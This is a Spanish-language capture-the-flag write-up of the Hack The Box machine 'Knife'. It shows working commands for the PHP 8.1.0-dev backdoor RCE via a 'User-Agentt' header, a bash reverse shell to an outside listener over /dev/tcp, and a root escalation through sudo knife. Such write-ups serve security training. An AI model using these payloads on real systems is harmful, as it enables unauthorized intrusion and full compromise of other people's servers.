## Knife — HackTheBox Writeup

---

### 📋 Información de la máquina

| Campo | Detalle |
| --- | --- |
| **Nombre** | Knife |
| **OS** | Linux |
| **Dificultad** | Easy |
| **Plataforma** | Hack The Box |
| **Técnicas** | PHP 8.1.0-dev Backdoor, RCE, Sudo Knife |

---

### 🔍 1. Enumeración — Nmap

bash

`nmap -sCV -p- --open -n -Pn -vvv -T5 10.129.5.155 -oN fullscan`

| Puerto | Servicio |
| --- | --- |
| 22 | SSH — OpenSSH 8.2p1 |
| 80 | HTTP — Apache 2.4.41 |

---

### 🌐 2. Enumeración Web

La página es una web médica simple sin nada interesante en el código fuente.

Lo clave está en los **headers HTTP**:

bash

`curl -I http://10.129.5.155`

`X-Powered-By: PHP/8.1.0-dev`

**PHP/8.1.0-dev** es una versión de desarrollo comprometida con una backdoor — **CVE-2021-49096**.

---

### 💥 3. Explotación — PHP 8.1.0-dev Backdoor

La backdoor se activa con el header `User-Agentt` (doble t) y el prefijo `zerodiumsystem`.

### Confirmar RCE

bash

`curl -s http://10.129.5.155 -H "User-Agentt: zerodiumsystem('id');"`

Resultado: `uid=1000(james) gid=1000(james) groups=1000(james)` ✅

### Reverse Shell

**Terminal 1 — Listener:**

bash

`nc -lvnp 4444`

**Terminal 2 — Payload:**

bash

`curl -s http://10.129.5.155 -H "User-Agentt: zerodiumsystem('bash -c \"bash -i >& /dev/tcp/10.10.14.56/4444 0>&1\"');"`

---

### 👤 4. User flag

bash

`cat ~/user.txt`

---

### ⬆️ 5. Escalada de privilegios — knife

bash

`sudo -l
# (root) NOPASSWD: /usr/bin/knife`

`knife` es una herramienta de Chef que puede ejecutar código Ruby. Con sudo podemos abrir una bash como root:

bash

`sudo knife exec -E 'exec "/bin/bash"'`

---

### 🏆 6. Root flag

bash

`cat /root/root.txt`

---

### 📚 Lecciones aprendidas

- Siempre revisar los headers HTTP — `X-Powered-By` revela tecnologías y versiones
- Versiones **dev** en producción son señal de alerta inmediata
- `sudo -l` es siempre el primer comando tras obtener acceso
- GTFOBins tiene entradas para knife y muchas otras herramientas de administración

---

### 🛠️ Herramientas

| Herramienta | Uso |
| --- | --- |
| Nmap | Enumeración |
| curl | Detección de headers y explotación RCE |
| Netcat | Listener reverse shell |
| knife | Escalada de privilegios |
